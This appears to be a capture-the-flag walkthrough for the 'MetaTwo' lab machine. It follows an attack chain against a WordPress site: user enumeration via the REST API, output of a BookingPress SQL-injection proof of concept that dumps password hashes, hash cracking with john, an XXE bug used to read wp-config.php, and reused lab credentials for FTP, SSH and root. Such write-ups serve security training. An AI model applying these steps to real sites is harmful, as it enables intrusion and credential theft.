# MetaTwo

## IP = 10.10.11.186

### WPScan: xmlrpc.php
### Get users: curl http://metapress.htb/wp-json/wp/v2/users
```json
[{"id":1,"name":"admin","url":"http:\/\/metapress.htb","description":"","link":"http:\/\/metapress.htb\/author\/admin\/","slug":"admin","avatar_urls":{"24":"http:\/\/2.gravatar.com\/avatar\/816499be5007457d126357a63115cd9c?s=24&d=mm&r=g","48":"http:\/\/2.gravatar.com\/avatar\/816499be5007457d126357a63115cd9c?s=48&d=mm&r=g","96":"http:\/\/2.gravatar.com\/avatar\/816499be5007457d126357a63115cd9c?s=96&d=mm&r=g"},"meta":[],"_links":{"self":[{"href":"http:\/\/metapress.htb\/wp-json\/wp\/v2\/users\/1"}],"collection":[{"href":"http:\/\/metapress.htb\/wp-json\/wp\/v2\/users"}]}}]
```

### Found plugin bookingpress, vulnerable version:
```
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

### Cracked password of the `manager` user:
```
└─$ john -w=/usr/share/wordlists/rockyou.txt target_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)     
1g 0:00:00:07 DONE (2023-02-03 12:53) 0.1277g/s 14099p/s 14099c/s 14099C/s penny6..onelove7
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

### Wordpress 5.6 -> CVE in XML: https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
Content of wp-config.php:
```
<?php                                                                                                                                                                                                                                      
/** The name of the database for WordPress */                                                                                                                                                                                              
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

## Use credentials to connect with FTP, get send_email.php and use the credentials to login SSH
`jnelson:Cb4_JmWM8zUZWMu@Ys`

## Passpie files in the home, also with the root one

blink182

passpie copy root@ssh --to stdout

p7qfAZt4_A1xo_0x

su root
